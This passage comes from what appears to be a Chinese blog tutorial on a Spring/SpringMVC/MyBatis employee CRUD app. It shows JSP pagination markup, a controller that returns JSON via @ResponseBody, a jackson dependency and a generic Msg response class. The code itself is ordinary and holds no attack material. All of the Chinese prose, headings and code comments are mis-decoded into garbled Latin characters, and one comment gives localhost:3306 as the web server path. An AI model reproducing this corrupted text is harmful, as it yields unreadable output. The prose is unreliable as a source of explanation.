class="template-variable">&#123;pageInfo.hasPreviousPage&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=$</span></span></span><span class="template-variable">&#123;pageInfo.pageNum-1&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">aria-label</span>=<span class="string">"Previous"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;laquo;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>                        éå†æ˜¾ç¤ºé¡µç ï¼Œå½“å‰é¡µç é«˜äº®<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">c:forEach</span> <span class="attr">items</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageInfo.navigatepageNums&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">var</span>=<span class="string">"pageNumb"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageNumb == pageInfo.pageNum&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>$</span><span class="template-variable">&#123;pageNumb&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageNumb != pageInfo.pageNum&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=$</span></span></span><span class="template-variable">&#123;pageNumb&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>$</span><span class="template-variable">&#123;pageNumb&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">c:forEach</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>                        æœ‰ä¸‹ä¸€é¡µå†æ˜¾ç¤ºç®­å¤´ï¼Œæ²¡æœ‰åˆ™ä¸æ˜¾ç¤º<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageInfo.hasNextPage&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=$</span></span></span><span class="template-variable">&#123;pageInfo.pageNum+1&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">aria-label</span>=<span class="string">"Next"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;raquo;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=$</span></span></span><span class="template-variable">&#123;pageInfo.pages&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>æœ«é¡µ<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>è¿™æ ·å°±å®ç°äº†é¢„è§ˆå›¾çš„æ•ˆæœå•¦</p><h1 id="æ§åˆ¶å™¨è¿”å›JSONæ•°æ®"><a href="#æ§åˆ¶å™¨è¿”å›JSONæ•°æ®" class="headerlink" title="æ§åˆ¶å™¨è¿”å›JSONæ•°æ®"></a>æ§åˆ¶å™¨è¿”å›JSONæ•°æ®</h1><p>ç›®å‰æˆ‘ä»¬è¿™æ ·å†™ï¼Œåªé€‚ç”¨äºæµè§ˆå™¨ä¸æœåŠ¡å™¨ï¼Œæ‰€ä»¥è¿˜éœ€è¦è€ƒè™‘ç§»åŠ¨è®¾å¤‡ç”¨æˆ·ï¼Œå°±éœ€è¦å€ŸåŠ©JSON</p><p>ç›®å‰æœ€å¥½çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯æœåŠ¡å™¨ç«¯å»å¤„ç†JSONæ•°æ®ï¼Œä½¿ç”¨Ajaxè¯·æ±‚æ¥å®Œæˆ</p><h2 id="æŸ¥è¯¢-Ajax"><a href="#æŸ¥è¯¢-Ajax" class="headerlink" title="æŸ¥è¯¢-Ajax"></a>æŸ¥è¯¢-Ajax</h2><ol><li><p>index.jspé¡µé¢ç›´æ¥å‘é€ajaxè¯·æ±‚è¿›è¡Œå‘˜å·¥åˆ†é¡µæ•°æ®çš„æŸ¥è¯¢</p></li><li><p>æœåŠ¡å™¨å°†æŸ¥å‡ºçš„æ•°æ®ï¼Œä»¥jsonå­—ç¬¦ä¸²çš„å½¢å¼è¿”å›ç»™æµè§ˆå™¨</p></li><li><p>æµè§ˆå™¨æ”¶åˆ°jså­—ç¬¦ä¸²ã€‚å¯ä»¥ä½¿ç”¨jså¯¹jsonè¿›è¡Œè§£æï¼Œä½¿ç”¨jsé€šè¿‡domå¢åˆ æ”¹çš„å½¢å¼æ¥æ”¹å˜é¡µé¢</p></li><li><p>è¿”å›jsonã€‚å®ç°å®¢æˆ·ç«¯çš„æ— å…³æ€§</p></li></ol><h3 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h3><p>é¦–å…ˆè¦ä¿®æ”¹Controller<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * å¯¼å…¥jacksonåŒ…</span></span><br><span class="line"><span class="comment">    * @param pn</span></span><br><span class="line"><span class="comment">    * @return</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   @<span class="constructor">RequestMapping(<span class="string">"/emps"</span>)</span></span><br><span class="line">   @ResponseBody</span><br><span class="line">   public PageInfo get<span class="constructor">EmpsWithJson(@RequestParam(<span class="params">value</span> = <span class="string">"pn"</span>,<span class="params">defaultValue</span> = <span class="string">"1"</span>)</span>Integer pn)&#123;</span><br><span class="line">       <span class="comment">//è¿™ä¸æ˜¯ä¸€ä¸ªåˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line">       <span class="comment">//å¼•å…¥PageHelperåˆ†é¡µæ’ä»¶</span></span><br><span class="line">       <span class="comment">//åœ¨æŸ¥è¯¢ä¹‹å‰åªéœ€è¦è°ƒç”¨,ä¼ å…¥é¡µç ä»¥åŠæ¯é¡µçš„ä¸ªæ•°</span></span><br><span class="line">       <span class="module-access"><span class="module"><span class="identifier">PageHelper</span>.</span></span>start<span class="constructor">Page(<span class="params">pn</span>,5)</span>;</span><br><span class="line">       <span class="comment">//startPageåé¢ç´§è·Ÿçš„è¿™ä¸ªæŸ¥è¯¢å°±æ˜¯ä¸€ä¸ªåˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line">       List&lt;Employee&gt; emps = employeeService.get<span class="constructor">All()</span>;</span><br><span class="line">       <span class="comment">//ä½¿ç”¨PageInfoåŒ…è£…æŸ¥è¯¢åçš„ç»“æœï¼Œåªéœ€è¦å°†PageInfoäº¤ç»™é¡µé¢å°±è¡Œäº†</span></span><br><span class="line">       <span class="comment">//å°è£…äº†è¯¦ç»†çš„åˆ†é¡µä¿¡æ¯ï¼ŒåŒ…æ‹¬æœ‰æˆ‘ä»¬æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®,è¿ç»­æ˜¾ç¤ºçš„é¡µæ•°</span></span><br><span class="line">       PageInfo page= <span class="keyword">new</span> <span class="constructor">PageInfo(<span class="params">emps</span>,5)</span>;</span><br><span class="line">       return page;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>æƒ³è¦è®©ResponseBodyå®ç°ï¼Œéœ€è¦å¯¼å…¥jacksonåŒ…ï¼Œåœ¨pom.xmlä¸­æ·»åŠ ä¾èµ–<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--   jasonåŒ… --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.11.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>å†æ¬¡è®¿é—®ä¹‹å‰çš„é¡µé¢ï¼Œå°±ä¼šå‘ç°å·²ç»å˜æˆäº†jsonå­—ç¬¦ä¸²äº†</p><p>ä½†æ˜¯è¿™æ ·åªè¿”å›pageï¼Œç”¨æˆ·ä¸çŸ¥é“è‡ªå·±æ˜¯å¦æ“ä½œæˆåŠŸï¼Œæ‰€ä»¥æˆ‘ä»¬å†™ä¸€ä¸ªé€šç”¨çš„è¿”å›ç±»<br>åœ¨beanä¸‹æ–°å»ºä¸€ä¸ªMsg.class<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit.crud.bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é€šç”¨çš„è¿”å›ç±»</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Msg</span> &#123;</span></span><br><span class="line">    <span class="comment">//çŠ¶æ€ç  200-æˆåŠŸ  404-å¤±è´¥</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> code;</span><br><span class="line">    <span class="comment">//æç¤ºä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> msg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ç”¨æˆ·è¦è¿”å›ç»™æµè§ˆå™¨çš„æ•°æ®</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;<span class="keyword">String</span>,Object&gt; extend=<span class="keyword">new</span> HashMap&lt;<span class="keyword">String</span>,Object&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Msg <span class="title">success</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Msg result=<span class="keyword">new</span> Msg();</span><br><span class="line">        result.setCode(<span class="number">200</span>);</span><br><span class="line">        result.setMsg(<span class="string">"å¤„ç†æˆåŠŸ!"</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Msg <span class="title">fail</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Msg result=<span class="keyword">new</span> Msg();</span><br><span class="line">        result.setCode(<span class="number">404</span>);</span><br><span class="line">        result.setMsg(<span class="string">"å¤„ç†å¤±è´¥ï¼"</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Msg <span class="title">add</span><span class="params">(<span class="keyword">String</span> key,Object value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.getExtend().<span class="built_in">put</span>(key, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCode</span><span class="params">(<span class="keyword">int</span> code)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.code = code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getMsg</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMsg</span><span class="params">(<span class="keyword">String</span> msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Map&lt;<span class="keyword">String</span>, Object&gt; getExtend() &#123;</span><br><span class="line">        <span class="keyword">return</span> extend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setExtend</span><span class="params">(Map&lt;<span class="keyword">String</span>, Object&gt; extend)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.extend = extend;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å°†Controllerä¿®æ”¹ä¸º<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@<span class="constructor">RequestMapping(<span class="string">"/emps"</span>)</span></span><br><span class="line">@ResponseBody</span><br><span class="line">public Msg get<span class="constructor">EmpsWithJson(@RequestParam(<span class="params">value</span> = <span class="string">"pn"</span>,<span class="params">defaultValue</span> = <span class="string">"1"</span>)</span>Integer pn)&#123;</span><br><span class="line">    <span class="comment">//è¿™ä¸æ˜¯ä¸€ä¸ªåˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line">    <span class="comment">//å¼•å…¥PageHelperåˆ†é¡µæ’ä»¶</span></span><br><span class="line">    <span class="comment">//åœ¨æŸ¥è¯¢ä¹‹å‰åªéœ€è¦è°ƒç”¨,ä¼ å…¥é¡µç ä»¥åŠæ¯é¡µçš„ä¸ªæ•°</span></span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">PageHelper</span>.</span></span>start<span class="constructor">Page(<span class="params">pn</span>,5)</span>;</span><br><span class="line">    <span class="comment">//startPageåé¢ç´§è·Ÿçš„è¿™ä¸ªæŸ¥è¯¢å°±æ˜¯ä¸€ä¸ªåˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line">    List&lt;Employee&gt; emps = employeeService.get<span class="constructor">All()</span>;</span><br><span class="line">    <span class="comment">//ä½¿ç”¨PageInfoåŒ…è£…æŸ¥è¯¢åçš„ç»“æœï¼Œåªéœ€è¦å°†PageInfoäº¤ç»™é¡µé¢å°±è¡Œäº†</span></span><br><span class="line">    <span class="comment">//å°è£…äº†è¯¦ç»†çš„åˆ†é¡µä¿¡æ¯ï¼ŒåŒ…æ‹¬æœ‰æˆ‘ä»¬æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®,è¿ç»­æ˜¾ç¤ºçš„é¡µæ•°</span></span><br><span class="line">    PageInfo page= <span class="keyword">new</span> <span class="constructor">PageInfo(<span class="params">emps</span>,5)</span>;</span><br><span class="line">    return <span class="module-access"><span class="module"><span class="identifier">Msg</span>.</span></span>success<span class="literal">()</span>.add(<span class="string">"pageInfo"</span>,page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™æ ·ä¸€æ¥æœ‰äº†çŠ¶æ€ç å’Œæ–‡å­—çš„è¿”å›æ•ˆæœï¼Œç”¨æˆ·å°±çŸ¥é“æ˜¯å¦æ“ä½œæˆåŠŸäº†</p><p>æ¥ä¸‹æ¥å°±æ˜¯ç”¨ajaxï¼Œdomæ¥å®ŒæˆCRUDäº†</p><p>æ–°å»ºä¸€ä¸ªindex.jsp<br>å°†ä¹‹å‰list.jspçš„å†…å®¹å¤åˆ¶è¿‡æ¥<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span></span></span></span><br><span class="line"><span class="xml">    webè·¯å¾„ï¼š</span></span><br><span class="line"><span class="xml">        ä¸ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥å½“å‰èµ„æºçš„è·¯å¾„ä¸ºåŸºå‡†ï¼Œç»å¸¸å®¹æ˜“å‡ºç°é—®é¢˜</span></span><br><span class="line"><span class="xml">        ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥æœåŠ¡å™¨çš„è·¯å¾„ä¸ºæ ‡å‡†ï¼ˆhttp://localhost:3306ï¼‰éœ€è¦åŠ ä¸Šé¡¹ç›®å</span></span><br><span class="line"><span class="xml">            http://localhost:3306/crud</span></span><br><span class="line"><span class="xml">--%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">uri</span>=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> <span class="attr">prefix</span>=<span class="string">"c"</span>%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>å‘˜å·¥åˆ—è¡¨<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="xml">        pageContext.setAttribute("APP_PATH",request.getContextPath());</span></span><br><span class="line"><span class="xml">    %&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--æ ‡é¢˜--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--æŒ‰é’®--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>æ–°å¢<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>åˆ é™¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--æ˜¾ç¤ºè¡¨æ ¼æ•°æ®--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span 